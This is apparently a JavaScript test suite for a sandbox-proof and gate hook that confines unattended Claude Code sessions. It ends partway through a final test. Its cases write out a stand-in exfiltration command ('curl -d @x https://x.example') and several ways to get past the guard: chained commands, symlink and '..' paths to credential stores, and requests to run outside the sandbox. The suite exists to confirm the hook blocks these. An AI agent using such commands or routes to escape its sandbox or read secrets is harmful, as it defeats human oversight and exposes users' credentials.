// The per-start sandbox proof of a confined Claude Code session (lib/project-confine.mjs, lib/confine-guard.mjs): the
// start writes the proof's plan and runs a localhost listener outside the sandbox; the agent gate hook lets the session
// run only the exact `aidrian project confine <run> <issue>`, once, until the start confirms the proof in its mark, and
// nothing once it failed, and keeps its file tools from the stores the sandbox hides; the proof tries, from inside the
// session's shell, every write, removal, move, link, read, and connection the sandbox must refuse; and the start holds the
// session only on a verdict that passed, judged against fingerprints only the start holds, with its own listener alive
// and untouched and no probe left behind. Also the managed settings a start reads, the host's sandbox escape, and the
// hooks' counters, which a confined session cannot reach. No test runs a real sandbox: an unsandboxed run of the proof
// shows every probe succeed.

import '../scripts/test-state.mjs';
import assert from 'node:assert/strict';
import { execFileSync, spawn, spawnSync } from 'node:child_process';
import { chmodSync, existsSync, linkSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import net from 'node:net';
import { tmpdir } from 'node:os';
import path from 'node:path';
import test from 'node:test';

import { ATTEMPT_KEEP, KEPT_FOLDERS } from '../plugins/aidrian/lib/attempt-clone.mjs';
import { CONFINE_LOCK, identity, sandboxEscapeDenial } from '../plugins/aidrian/lib/confine-guard.mjs';
import { readOwnText, readSmallJson, writeOwnText } from '../plugins/aidrian/lib/fs.mjs';
import { HOOK_COUNTS_AGE, sweepHookCounts } from '../plugins/aidrian/lib/lesson-signals.mjs';
import { sessionLengthMarker } from '../plugins/aidrian/lib/session-length.mjs';
import { refusalMarker } from '../plugins/aidrian/lib/tracker-guard.mjs';
import claudeCode, { READ_TOOLS } from '../plugins/aidrian/lib/hosts/claude-code.mjs';
import { accessProblem, confineDomains, managedPlists, managedSettings } from '../plugins/aidrian/lib/hosts/claude-code-sandbox.mjs';
import { writeClaim, writeHandoff } from '../plugins/aidrian/lib/project-token.mjs';
import codex from '../plugins/aidrian/lib/hosts/codex.mjs';
import { fileReadOf } from '../plugins/aidrian/lib/hosts/index.mjs';
import { childSendBacks, storeChildSendBacks } from '../plugins/aidrian/lib/child-send-backs.mjs';
import { alive, CONFINE_PLAN, CONFINE_VERDICT, confineCheck, confineDenial, HOOK_PENDING, hookPending, hostVarsProblem, isConfineCall, LISTENER_START, prepareConfine, runConfine, sentinelHits, SHELL_VARS, shellVarsProblem, startListener, unlistedHost, watchProblem } from '../plugins/aidrian/lib/project-confine.mjs';
import { ACTIONS, projectCommand } from '../plugins/aidrian/lib/project-run-cli.mjs';
import { projectPrompt } from '../plugins/aidrian/lib/project-run-gate.mjs';
import { projectCommandDenial } from '../plugins/aidrian/lib/project-run-guard.mjs';
import { REGISTRY_NAMES, registryHosts } from '../plugins/aidrian/lib/project-registries.mjs';
import { SHELL_VARS as START_SHELL_VARS } from '../plugins/aidrian/lib/project-start.mjs';
import { markFolder, markFolders, markPending, markUnattended, readUnattendedMark } from '../plugins/aidrian/lib/unattended-mark.mjs';
import { hookCall } from './hook-call.mjs';
import { fakeClaude, OTHER, OWN_PLUGIN, passVerdict, runFixture, STARTED } from './project-start-fixture.mjs';

const HOOK = path.resolve(import.meta.dirname, '../plugins/aidrian/scripts/hook-agent-gates.mjs');
const FS_LIB = path.resolve(import.meta.dirname, '../plugins/aidrian/lib/fs.mjs');
const NAMES = { names: { human: 'the Human' } };
const SESSION = 'confined-session-1';
const GITHUB = ['github.com', 'api.github.com'];

// An attempt's folder as the start lays it out, `<root>/state/runs/launch/attempts/ENG-1.1/`, with the keep files, the
// clone's git config and settings placeholder, the mark folders, a credential file and folder, and the shell
// environment the gate writes.
function attempt(t, { vars = null } = {}) {
  const root = realpathSync(mkdtempSync(path.join(tmpdir(), 'aidrian-confine-')));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const folder = path.join(root, 'state', 'runs', 'launch', 'attempts', 'ENG-1.1');
  const [work, git, drop, cache] = ['work', 'git', 'drop', 'cache'].map((name) => path.join(folder, name));
  for (const each of [path.join(work, '.claude'), git, drop, cache]) mkdirSync(each, { recursive: true });
  for (const name of KEPT_FOLDERS) writeFileSync(path.join(folder, name, ATTEMPT_KEEP), '', { mode: 0o400 });
  writeFileSync(path.join(git, 'config'), '[core]\n\tbare = false\n');
  writeFileSync(path.join(work, '.git'), `gitdir: ${git}\n`);
  writeFileSync(path.join(work, '.claude', 'settings.json'), '{}\n');
  writeFileSync(path.join(work, 'README.md'), '# widgets\n');
  const home = path.join(root, 'home');
  const env = { XDG_STATE_HOME: path.join(root, 'xdg') };
  for (const dir of markFolders({ env, home })) mkdirSync(dir, { recursive: true });
  const secret = path.join(home, '.npmrc');
  writeFileSync(secret, '//registry.npmjs.org/:_authToken=s3cret-token\n');
  const keys = path.join(home, '.ssh');
  mkdirSync(keys);
  writeFileSync(path.join(keys, 'id_test'), 'PRIVATE');
  const shell = vars ?? { npm_config_cache: path.join(cache, 'npm'), GOFLAGS: '-modcacherw' };
  writeFileSync(path.join(folder, SHELL_VARS), JSON.stringify(shell));
  return { root, folder, work, git, drop, cache, home, env, secret, keys, vars: shell };
}

// A listener the test stands in for: this process, on a closed port, with the port file the start's listener writes,
// and the start's sentinel connection to it, which it notes with no other connection.
const noHits = () => ({ others: 0 });
const fakeListen = (folder) => {
  writeFileSync(path.join(folder, 'confine-listener.json'), JSON.stringify({ port: 9, pid: process.pid }));
  return { port: 9, pid: process.pid, stop() {} };
};

// The plan of `at`.
function plan(at, { listen = fakeListen, domains = GITHUB, reads = [at.secret, at.keys] } = {}) {
  const made = prepareConfine({ folder: at.folder, run: 'launch', key: 'ENG-1', attempt: 1, work: at.work, git: at.git, drop: at.drop, cache: at.cache, domains, reads, env: at.env, home: at.home, listen });
  assert.equal(made.problem, undefined, made.problem);
  return made;
}

const bash = (command, cwd, session = SESSION, more = {}) => ({ session_id: session, tool_name: 'Bash', tool_input: { command, ...more }, cwd });
const verdictAt = (at) => readSmallJson(path.join(at.drop, CONFINE_VERDICT), 1024 * 1024);
const writeVerdict = (at, value) => writeFileSync(path.join(at.drop, CONFINE_VERDICT), JSON.stringify(value));
// The plan with its unlisted host a closed local port, so no test reaches the network.
const offline = (at, made) => writeFileSync(path.join(at.folder, CONFINE_PLAN), JSON.stringify({ ...made.plan, unlisted: { host: '127.0.0.1', port: 9 } }));

test('the proof names a host outside every allowed domain and registry, and its files are spelled as the start\'s', () => {
  assert.equal(unlistedHost([...GITHUB, ...registryHosts(REGISTRY_NAMES)]), 'example.com');
  assert.equal(unlistedHost(['*.com', 'example.net']), 'example.org');
  assert.equal(unlistedHost(['example.com', 'example.net', '*.example.org']), null);
  assert.equal(unlistedHost(['*']), null, 'a wildcard allows every host');
  assert.equal(SHELL_VARS, START_SHELL_VARS);
  assert.ok(ACTIONS.includes('confine'));
});

test('Claude Code proves each start\'s sandbox; Codex is unchanged', () => {
  const cap = claudeCode.capabilities.projectStart;
  assert.equal(cap.confineProof, true);
  const reads = cap.confineReads({ env: { PATH: '' }, home: '/user-home' });
  for (const store of ['/user-home/.ssh', '/user-home/.npmrc', '/user-home/.claude/.credentials.json']) assert.ok(reads.includes(store), store);
  assert.equal(typeof cap.confineDomains, 'function');
  assert.equal(codex.capabilities.projectStart.confineProof, undefined);
  assert.equal(codex.capabilities.projectStart.verified, 'unverified');
});

test('the unlisted host stays outside the allowedDomains the user`s settings add, and a wildcard there refuses to prepare', (t) => {
  const at = attempt(t);
  const config = path.join(at.home, '.claude');
  mkdirSync(config, { recursive: true });
  writeFileSync(path.join(config, 'settings.json'), JSON.stringify({ sandbox: { network: { allowedDomains: ['example.com'] } } }));
  const added = confineDomains({ env: {}, home: at.home, platform: 'linux', managed: { dir: path.join(at.root, 'none'), plists: [] } });
  assert.deepEqual(added, ['example.com']);
  assert.equal(plan(at, { domains: [...GITHUB, ...added] }).plan.unlisted.host, 'example.net');
  const refused = prepareConfine({ folder: at.folder, run: 'launch', key: 'ENG-1', attempt: 1, work: at.work, git: at.git, drop: at.drop, cache: at.cache, domains: [...GITHUB, '*'], env: at.env, home: at.home, listen: fakeListen });
  assert.match(refused.problem, /remove "\*" or the example domains from sandbox\.network\.allowedDomains/u);
});

test('the prompt makes the exact confine command the session`s first call only where the host proves its sandbox', () => {
  const given = { run: 'launch', key: 'ENG-1', attempt: 1, branch: 'feat/eng-1', clone: '/c' };
  assert.match(projectPrompt({ ...given, confine: true }), /first tool call, run exactly `aidrian project confine launch ENG-1` with the Bash tool, alone/u);
  assert.doesNotMatch(projectPrompt(given), /confine/u);
});

test('run outside any sandbox, the proof finds every probe succeed, undoes each, and fails; the start finds the reads landed', async (t) => {
  const at = attempt(t);
  const listener = startListener(at.folder);
  assert.equal(listener.problem, undefined, listener.problem);
  t.after(() => listener.stop());
  const made = plan(at, { listen: () => listener });
  offline(at, made);
  // No fingerprint, entry name, or byte of a store is where the session can read it.
  const planText = readFileSync(path.join(at.folder, CONFINE_PLAN), 'utf8');
  for (const each of ['id_test', 's3cret', ...Object.values(made.prints)]) assert.ok(!planText.includes(each), each);
  const config = readFileSync(path.join(at.git, 'config'), 'utf8');
  const result = await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: { CLAUDE_CODE_SESSION_ID: SESSION } });
  assert.equal(result.exitCode, 1);
  assert.match(result.out[0], /^halt the sandbox does not hold for this session/u);
  const verdict = verdictAt(at);
  assert.equal(verdict.pass, false);
  assert.equal(verdict.session, SESSION);
  const failed = verdict.failed.join('\n');
  for (const each of [
    ...markFolders({ env: at.env, home: at.home }).map((dir) => `write ${dir}/.confine-probe-`), `write ${at.folder}/confine-probe-`, `write ${at.home}/confine-probe-`,
    `write ${at.git}/config`, `write ${at.work}/.claude/settings.json`,
    `remove ${at.cache}/${ATTEMPT_KEEP}`, `remove ${at.drop}/${ATTEMPT_KEEP}`, `move ${at.cache}`, `move ${at.drop}`, `link ${at.cache}`, `write through a link ${at.drop}`,
    'a localhost listener outside the sandbox', 'the cache variables npm_config_cache, GOFLAGS are not in force',
  ]) assert.ok(failed.includes(each), `${each}\n${failed}`);
  assert.doesNotMatch(failed, /reach 127\.0\.0\.1:9\b/u, 'a closed port is refused');
  assert.doesNotMatch(failed, /read /u, 'the start judges the reads');
  assert.ok(!JSON.stringify(verdict).includes('id_test') && !JSON.stringify(verdict).includes('s3cret'), 'what a read saw is salted');
  for (const name of KEPT_FOLDERS) {
    assert.ok(lstatSync(path.join(at.folder, name)).isDirectory(), name);
    assert.ok(existsSync(path.join(at.folder, name, ATTEMPT_KEEP)), `${name}'s keep file`);
  }
  assert.equal(readFileSync(path.join(at.git, 'config'), 'utf8'), config);
  // The reads, judged by the start against its fingerprints: each landed.
  writeVerdict(at, { ...passVerdict(made.plan, SESSION), reads: verdict.reads });
  assert.match(confineCheck({ folder: at.folder, session: SESSION, prints: made.prints }).problem, /^read .*(?:\.npmrc|\.ssh), which the sandbox should hide/u);
  // The listener, outside the sandbox, saw the connection: the start fails the proof on that alone.
  writeVerdict(at, passVerdict(made.plan, SESSION));
  assert.match(confineCheck({ folder: at.folder, session: SESSION, prints: made.prints }).problem, /reached the localhost listener/u);
  assert.equal(shellVarsProblem(at.folder, at.vars), null);
  // The proof runs once a start.
  assert.match((await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: {} })).err.join('\n'), /ran already, and runs once/u);
});

test('on Linux the host masks a hidden store with an empty one: a read that opens it and sees nothing is refused', async (t) => {
  const at = attempt(t);
  const made = plan(at);
  offline(at, made);
  assert.deepEqual(made.plan.reads.map((each) => each.path).sort(), [at.secret, at.keys].sort());
  // What the sandbox shows the session: an empty folder and an empty file where the stores are.
  rmSync(path.join(at.keys, 'id_test'));
  writeFileSync(at.secret, '');
  await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: at.vars });
  writeVerdict(at, { ...passVerdict(made.plan, SESSION), reads: verdictAt(at).reads });
  assert.deepEqual(confineCheck({ folder: at.folder, session: SESSION, prints: made.prints, sentinel: noHits }), { pass: true });
  // An empty store is not probed: it cannot tell a masked read from a real one.
  const empty = attempt(t);
  const none = path.join(empty.home, 'empty-store');
  mkdirSync(none);
  writeFileSync(path.join(empty.home, '.netrc'), '');
  assert.deepEqual(plan(empty, { reads: [none, path.join(empty.home, '.netrc')] }).plan.reads, []);
});

test('the main checkout is fingerprinted by an entry other than its git folder, which the sandbox opens again', (t) => {
  const at = attempt(t);
  const main = path.join(at.root, 'main');
  mkdirSync(path.join(main, '.git'), { recursive: true });
  const only = prepareConfine({ folder: at.folder, run: 'launch', key: 'ENG-1', attempt: 1, work: at.work, git: at.git, drop: at.drop, cache: at.cache, domains: GITHUB, reads: [], main, mainGit: path.join(main, '.git'), env: at.env, home: at.home, listen: fakeListen });
  assert.deepEqual(only.plan.reads, [], 'a main checkout with nothing but its git folder');
  assert.deepEqual(only.plan.unreadable, [main]);
  writeFileSync(path.join(main, 'package.json'), '{}');
  const some = prepareConfine({ folder: at.folder, run: 'launch', key: 'ENG-1', attempt: 1, work: at.work, git: at.git, drop: at.drop, cache: at.cache, domains: GITHUB, reads: [], main, mainGit: path.join(main, '.git'), env: at.env, home: at.home, listen: fakeListen });
  assert.deepEqual(some.plan.reads, [{ path: main, folder: true }]);
});

test('the start holds the session only on a verdict of its own plan, with its listener alive and nothing left behind', (t) => {
  const at = attempt(t);
  const { plan: made, prints } = plan(at);
  const check = (more = {}) => confineCheck({ folder: at.folder, session: SESSION, prints, sentinel: noHits, ...more });
  assert.equal(check(), null, 'no verdict yet');
  writeVerdict(at, passVerdict(made, SESSION));
  assert.deepEqual(check(), { pass: true });
  writeVerdict(at, passVerdict(made, null));
  assert.deepEqual(check(), { pass: true }, 'a shell that names no session');
  writeVerdict(at, passVerdict(made, OTHER));
  assert.match(check().problem, /names the session/u);
  writeVerdict(at, { ...passVerdict(made, SESSION), nonce: '0'.repeat(16) });
  assert.match(check().problem, /not this start's/u);
  writeVerdict(at, { ...passVerdict(made, SESSION), pass: false, failed: ['write /x'] });
  assert.equal(check().problem, 'write /x');
  writeVerdict(at, passVerdict(made, SESSION));
  // A listener that is not alive, or not the one the start ran on its port, proves nothing of a refused connection.
  assert.match(check({ isAlive: () => false }).problem, /not the one the start ran, alive on its port/u);
  writeFileSync(path.join(at.folder, 'confine-listener.json'), JSON.stringify({ port: 10, pid: process.pid }));
  assert.match(check().problem, /not the one the start ran/u);
  const gone = spawnSync(process.execPath, ['-e', 'process.stdout.write(String(process.pid))'], { encoding: 'utf8' });
  writeFileSync(path.join(at.folder, 'confine-listener.json'), JSON.stringify({ port: 9, pid: Number(gone.stdout) }));
  writeFileSync(path.join(at.folder, CONFINE_PLAN), JSON.stringify({ ...made, local: { ...made.local, pid: Number(gone.stdout) } }));
  assert.match(check().problem, /not the one the start ran, alive on its port/u, 'a process that ended');
  writeFileSync(path.join(at.folder, CONFINE_PLAN), JSON.stringify(made));
  writeFileSync(path.join(at.folder, 'confine-listener.json'), JSON.stringify({ port: 9, pid: process.pid }));
  writeFileSync(path.join(at.home, `confine-probe-${made.nonce}`), '');
  assert.match(check().problem, /a probe left .*confine-probe-/u);
  rmSync(path.join(at.home, `confine-probe-${made.nonce}`));
  rmSync(path.join(at.cache, ATTEMPT_KEEP), { force: true });
  assert.match(check().problem, /cache folder or its keep file/u);
});

// A listener that notes each connection, and closes it, only a second after it accepts it, as one under load does.
const SLOW_LISTENER = [
  "const net = require('node:net'); const fs = require('node:fs');",
  'const [hits, portFile, life] = process.argv.slice(1);',
  "const server = net.createServer((socket) => setTimeout(() => { fs.appendFileSync(hits, `hit ${socket.remotePort}\\n`); socket.destroy(); }, 1000));",
  "server.listen(0, '127.0.0.1', () => fs.writeFileSync(portFile, JSON.stringify({ port: server.address().port, pid: process.pid })));",
  'setTimeout(() => process.exit(0), Number(life));',
].join('\n');

test('a connection the listener notes only after the verdict is read still fails the proof, through the start\'s own sentinel', async (t) => {
  const at = attempt(t);
  const listener = startListener(at.folder, { run: (exec, args, options) => spawn(exec, ['-e', SLOW_LISTENER, ...args.slice(2)], options) });
  assert.equal(listener.problem, undefined, listener.problem);
  t.after(() => listener.stop());
  const made = plan(at, { listen: () => listener });
  writeVerdict(at, passVerdict(made.plan, SESSION));
  assert.deepEqual(confineCheck({ folder: at.folder, session: SESSION, prints: made.prints }), { pass: true }, 'no connection: the sentinel alone');
  rmSync(path.join(at.folder, 'confine-hits'));
  // The session's connection completes at the handshake, before the listener notes it.
  await new Promise((resolve, reject) => {
    const socket = net.connect({ host: '127.0.0.1', port: listener.port });
    socket.once('connect', () => resolve(socket));
    socket.once('error', reject);
  });
  assert.equal(existsSync(path.join(at.folder, 'confine-hits')), false, 'not noted yet');
  assert.match(confineCheck({ folder: at.folder, session: SESSION, prints: made.prints }).problem, /reached the localhost listener/u);
  // A listener that never notes the sentinel leaves the proof unverified, and so failed.
  const deaf = sentinelHits({ folder: at.folder, host: '127.0.0.1', port: listener.port, wait: 200, run: () => ({ stdout: '40000' }), pause: () => {} });
  assert.match(deaf.problem, /was not noted within 0\.2 seconds, so whether a connection reached it cannot be told/u);
  // One deadline holds the connection and the reads together: a connection that took the whole wait leaves no read time.
  let now = 0;
  const pauses = [];
  const late = sentinelHits({ folder: at.folder, host: '127.0.0.1', port: listener.port, wait: 5000, clock: () => now, run: (_command, _args, options) => {
    assert.equal(options.timeout, 5000, 'the connection is held to the same wait');
    now += 4900;
    return { stdout: '40000' };
  }, pause: (ms) => {
    pauses.push(ms);
    now += ms;
  } });
  assert.match(late.problem, /was not noted within 5 seconds/u);
  assert.deepEqual(pauses, [50, 50], 'the 100 ms left, no more');
  assert.match(sentinelHits({ folder: at.folder, host: '127.0.0.1', port: 9 }).problem, /the start's own connection .* failed/u, 'a closed port');
});

test('a probe file there already counts as a write that landed', { skip: process.getuid?.() === 0 }, async (t) => {
  const at = attempt(t);
  const made = plan(at);
  offline(at, made);
  const probe = path.join(at.home, `confine-probe-${made.plan.nonce}`);
  // A home folder no write reaches, as a sandbox makes it.
  writeFileSync(probe, '');
  chmodSync(at.home, 0o500);
  try {
    await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: at.vars });
    assert.ok(verdictAt(at).failed.includes(`write ${probe}`), 'planted');
    chmodSync(at.home, 0o700);
    rmSync(probe);
    rmSync(path.join(at.drop, CONFINE_LOCK));
    chmodSync(at.home, 0o500);
    await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: at.vars });
    assert.ok(!verdictAt(at).failed.includes(`write ${probe}`), 'refused');
  } finally {
    chmodSync(at.home, 0o700);
  }
});

test('the hook lets a session whose proof is owed run only the exact confine command, once, and nothing once it failed', (t) => {
  const at = attempt(t);
  plan(at);
  const mark = (confine) => ({ root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine });
  const env = {};
  const exact = bash('aidrian project confine launch ENG-1', at.work);
  assert.equal(confineDenial(exact, { mark: mark(true), env }), null);
  assert.equal(isConfineCall(bash(`'${path.resolve(import.meta.dirname, '../plugins/aidrian/bin/aidrian')}' project confine launch ENG-1`, at.work), { run: 'launch', key: 'ENG-1' }), true);
  for (const command of ['aidrian project confine launch ENG-1; touch ~/x', 'aidrian project confine launch ENG-2', 'ls', 'aidrian project result launch ENG-1 --file r.json',
    'AIDRIAN=1 aidrian project confine launch ENG-1', 'aidrian project confine launch\nENG-1', 'aidrian project confine launch ENG-1\ntouch ~/x', 'aidrian\fproject confine launch ENG-1']) {
    assert.match(confineDenial(bash(command, at.work), { mark: mark(true), env })?.reason ?? '', /its first call must be exactly `aidrian project confine launch ENG-1`/u, JSON.stringify(command));
  }
  assert.match(confineDenial({ session_id: SESSION, tool_name: 'Write', tool_input: { file_path: path.join(at.home, '.zshrc'), content: 'x' }, cwd: at.work }, { mark: mark(true), env }).reason, /proves its sandbox/u);
  assert.equal(confineDenial(bash('ls', at.work), { mark: mark('passed'), env }), null);
  assert.match(confineDenial(exact, { mark: mark('failed'), env }).reason, /refuses every later call/u);
  // A verdict that passed, before the start confirmed it in the mark: every call waits, the confine command too.
  writeVerdict(at, { pass: true });
  for (const call of [bash('ls', at.work), exact]) assert.match(confineDenial(call, { mark: mark(true), env }).reason, /run the next step again in a few seconds/u);
  writeVerdict(at, { pass: false, failed: ['write /x'] });
  assert.match(confineDenial(exact, { mark: mark(true), env }).reason, /refuses every later call/u);
  rmSync(path.join(at.drop, CONFINE_VERDICT));
  assert.match(confineDenial(exact, { mark: mark('bogus'), env }).reason, /refuses every later call/u, 'a confine state that cannot be read');
  rmSync(path.join(at.folder, CONFINE_PLAN));
  assert.equal(confineDenial(bash('ls', at.work), { mark: { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1' }, env }), null, 'no proof and no plan, as on Codex');
});

test('a confine call before the session`s SessionStart hook ran answers a retry and takes no lock; after the hook, the same call runs the proof', async (t) => {
  const at = attempt(t);
  offline(at, plan(at));
  const [lock, verdict] = [path.join(at.drop, CONFINE_LOCK), path.join(at.drop, CONFINE_VERDICT)];
  const confine = () => runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: { ...at.vars, CLAUDE_CODE_SESSION_ID: SESSION } });
  // A start that hands its session no forge token writes no claim: nothing waits on the hook, as before.
  assert.equal(hookPending(at.folder), false);
  // The start's claim, with no handoff record yet: the host ran the session's first call before its SessionStart hook.
  assert.equal(writeClaim(at.folder, { claim: 'c'.repeat(48), source: 'login', token: 'd'.repeat(64) }), null);
  assert.equal(hookPending(at.folder), true);
  const early = await confine();
  assert.equal(early.exitCode, 1);
  assert.deepEqual(early.err, [`aidrian project confine: ${HOOK_PENDING}`]);
  assert.match(HOOK_PENDING, /has not run this session's SessionStart hook yet; run the same command again in a few seconds/u);
  assert.deepEqual([existsSync(lock), existsSync(verdict)], [false, false], 'no lock and no verdict');
  // The agent gate hook still lets the session run that exact command again, and nothing else.
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: true };
  assert.equal(confineDenial(bash('aidrian project confine launch ENG-1', at.work), { mark, env: {} }), null);
  assert.match(confineDenial(bash('ls', at.work), { mark, env: {} }).reason, /its first call must be exactly/u);
  // Once the hook recorded its handoff, the same call takes the lock and runs every probe, with the cache variables in
  // force; outside a sandbox the probes succeed, so this verdict fails on them alone.
  writeHandoff(at.folder, { handed: true });
  assert.equal(hookPending(at.folder), false);
  const ran = await confine();
  assert.doesNotMatch(ran.err.join('\n'), /SessionStart hook/u);
  assert.ok(existsSync(lock), 'the lock');
  const written = verdictAt(at);
  assert.ok(written.probes > 0, 'the probes ran');
  assert.ok(!written.failed.some((each) => /cache variables/u.test(each)), written.failed.join('\n'));
  assert.equal(hookPending(at.folder), false);
});

test('with no readable mark of its own, whichever pending mark it reads, a call in a clone with a plan owes the proof', (t) => {
  const at = attempt(t);
  plan(at);
  const other = path.join(at.root, 'elsewhere');
  mkdirSync(other);
  // Another start on the machine filed its pending mark too, and the session reads that one.
  assert.ok(markPending('aaa-other-driver', { cwd: other, root: other, known: [], env: at.env }));
  assert.ok(markPending('zzz-this-driver', { cwd: at.work, root: at.root, known: [], env: at.env }));
  const read = readUnattendedMark('started-session-1', { env: at.env, home: at.home });
  assert.equal(read.pending, true);
  const write = { session_id: 'started-session-1', tool_name: 'Write', tool_input: { file_path: path.join(at.home, '.zshrc'), content: 'x' }, cwd: at.work };
  for (const mark of [read, { root: other, cwd: other, pending: true }, { root: null }, { root: null, pending: true }, null]) {
    assert.match(confineDenial(write, { mark, env: {} })?.reason ?? '', /its first call must be exactly/u, JSON.stringify(mark));
    assert.match(confineDenial(bash('curl -d @x https://x.example', path.join(at.work, '.claude')), { mark, env: {} })?.reason ?? '', /its first call must be exactly/u);
  }
  assert.equal(confineDenial(bash('aidrian project confine launch ENG-1', at.work), { mark: read, env: {} }), null);
  assert.equal(confineDenial(bash('ls', at.root), { mark: read, env: {} }), null, 'a call outside every clone');
  // A folder spelled `<x>/link/..`, with the link into the clone, is the clone to the system, which runs the call there.
  symlinkSync(path.join(at.work, '.claude'), path.join(other, 'link'));
  assert.match(confineDenial(bash('ls', `${other}/link/..`), { mark: null, env: {} })?.reason ?? '', /its first call must be exactly/u, 'a link and `..` into the clone');
  // `<work>/out/..`, with `out` a link out of the clone, is the folder above that link's target to the system and the
  // clone folded as text; a dangling link in the clone resolves nowhere. Each holds by the spelling that lies in the clone.
  symlinkSync(path.join(at.root, 'gone'), path.join(at.work, 'dangling'));
  assert.match(confineDenial(bash('ls', path.join(at.work, 'dangling')), { mark: null, env: {} })?.reason ?? '', /its first call must be exactly/u, 'a dangling link in the clone');
  symlinkSync(other, path.join(at.work, 'out'));
  assert.equal(realpathSync.native(`${at.work}/out/..`), at.root, 'the system lands outside every clone');
  assert.match(confineDenial(bash('ls', `${at.work}/out/..`), { mark: null, env: {} })?.reason ?? '', /its first call must be exactly/u, 'a `..` after a link out of the clone');
  writeVerdict(at, { pass: false, failed: ['write /x'] });
  assert.match(confineDenial(bash('aidrian project confine launch ENG-1', at.work), { mark: null, env: {} }).reason, /refuses every later call/u);
});

test('a session a proof plan holds never reads a hidden store with the file tools, before or after the proof', (t) => {
  const at = attempt(t);
  plan(at);
  for (const confine of [true, 'passed']) {
    const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine };
    const call = (tool, input) => confineDenial({ session_id: SESSION, tool_name: tool, tool_input: input, cwd: at.work }, { mark, env: {} });
    for (const [tool, input] of [['Read', { file_path: at.secret }], ['Read', { file_path: path.join(at.keys, 'id_test') }], ['Grep', { pattern: 'x', path: at.keys }],
      ['Grep', { pattern: 'x', path: at.home }], ['Glob', { pattern: '**/*', path: at.keys }], ['Glob', { pattern: `${at.home}/**/*` }], ['LS', { path: at.keys }]]) {
      assert.match(call(tool, input)?.reason ?? '', /which the sandbox of a session no Human attends hides/u, `${confine} ${tool} ${JSON.stringify(input)}`);
    }
    // A link in the clone that leads to a store reads as the store.
    rmSync(path.join(at.work, 'key'), { force: true });
    symlinkSync(path.join(at.keys, 'id_test'), path.join(at.work, 'key'));
    assert.match(call('Read', { file_path: path.join(at.work, 'key') })?.reason ?? '', /hides/u);
    // `link/..`, with the link into a store's folder, is that folder's parent to the system, though it folds to the clone.
    rmSync(path.join(at.work, 'keys'), { force: true });
    symlinkSync(at.keys, path.join(at.work, 'keys'));
    assert.match(call('Read', { file_path: `${at.work}/keys/../.npmrc` })?.reason ?? '', /hides/u, 'a link and `..` to a store');
    assert.match(call('Read', { file_path: 'keys/../.npmrc' })?.reason ?? '', /hides/u, 'the same, relative to the call\'s folder');
    // A Glob whose `path` is a link to a folder beside a store, and whose pattern climbs from it: the store to the system.
    mkdirSync(path.join(at.home, 'side'), { recursive: true });
    rmSync(path.join(at.work, 'side'), { force: true });
    symlinkSync(path.join(at.home, 'side'), path.join(at.work, 'side'));
    assert.match(call('Glob', { pattern: '../.ssh/*', path: path.join(at.work, 'side') })?.reason ?? '', /hides/u, 'a Glob climbing from a link');
    assert.match(call('Glob', { pattern: '../.ssh/*', path: 'side' })?.reason ?? '', /hides/u, 'the same, relative to the call\'s folder');
    // An empty `path` is the call's folder: a pattern that climbs from there to a store reaches it.
    const climb = `${path.relative(at.work, at.keys)}/*`;
    assert.match(call('Glob', { pattern: climb, path: '' })?.reason ?? '', /hides/u, 'an empty path, the call\'s folder');
    if (confine === 'passed') {
      assert.equal(call('Read', { file_path: path.join(at.work, 'README.md') }), null);
      assert.equal(call('Grep', { pattern: 'x' }), null, 'the call`s folder, the clone');
    }
  }
  assert.deepEqual(fileReadOf({ tool_name: 'Glob', tool_input: { pattern: '/a/b/*.pem', path: '/c' } }), ['/c', '/a/b/']);
  assert.deepEqual(fileReadOf({ tool_name: 'Glob', tool_input: { pattern: '../x/*.pem', path: '/c/l/' } }), ['/c/l/', '/c/l/../x/'], 'joined as text, not folded');
  assert.deepEqual(fileReadOf({ tool_name: 'Glob', tool_input: { pattern: '../x/*.pem', path: '' } }), ['', '../x/'], 'an empty path, the call\'s folder');
  assert.equal(fileReadOf({ tool_name: 'Bash', tool_input: { command: 'cat x' } }), null);
});

test('a session no Human attends never asks the host to run a command outside its sandbox', async (t) => {
  const map = (more) => claudeCode.hookInput({ session_id: SESSION, tool_name: 'Bash', tool_input: { command: 'ls', ...more } });
  assert.equal(map({ dangerouslyDisableSandbox: true }).sandbox_escape, true);
  assert.equal(map({ dangerouslyDisableSandbox: false }).sandbox_escape, undefined);
  assert.equal(map({}).sandbox_escape, undefined);
  assert.equal(claudeCode.hookInput({ tool_name: 'Monitor', tool_input: { command: 'ls', dangerouslyDisableSandbox: true } }).sandbox_escape, true);
  const escape = { ...bash('ls', '/'), sandbox_escape: true };
  assert.match(sandboxEscapeDenial(escape, { mark: { root: '/r' } }).reason, /outside the host's sandbox/u);
  assert.match(sandboxEscapeDenial(escape, { mark: { root: null, pending: true } }).reason, /outside/u);
  assert.equal(sandboxEscapeDenial(escape, { mark: null }), null, 'an attended session');
  assert.equal(sandboxEscapeDenial(bash('ls', '/'), { mark: { root: '/r' } }), null);
  // Through the hook, called in this process as the host runs its script.
  const at = attempt(t);
  plan(at);
  assert.ok(markUnattended(SESSION, { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: 'passed' } }));
  const hook = (more) => hookCall(HOOK, { input: JSON.stringify(bash('ls', at.work, SESSION, more)), env: { ...process.env, ...at.env, CLAUDECODE: '1', AIDRIAN_TELEMETRY: '0' } });
  const refused = await hook({ dangerouslyDisableSandbox: true });
  assert.equal(refused.status, 2, refused.stderr);
  assert.match(refused.stderr, /outside the host's sandbox/u);
  assert.equal((await hook({ dangerouslyDisableSandbox: false })).status, 0);
  assert.equal((await hook({})).status, 0);
});

test('the hook fails the proof when its own environment, the host process\'s, holds the session\'s cache variables', (t) => {
